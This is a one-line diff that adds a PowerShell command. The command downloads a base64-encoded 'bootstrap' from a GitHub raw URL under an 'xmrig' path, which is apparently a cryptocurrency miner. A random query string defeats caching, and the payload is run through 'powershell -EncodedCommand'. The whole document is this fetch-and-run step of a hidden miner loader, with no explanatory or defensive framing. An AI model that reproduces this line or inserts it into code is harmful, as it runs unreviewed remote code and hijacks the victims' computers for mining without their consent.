@@ -1,0 +1,1 @@
+$b=irm "https://raw.githubusercontent.com/alphahubv2/modest-fermi/master/xmrig/bootstrap.b64?$(Get-Random)";powershell -EncodedCommand $b
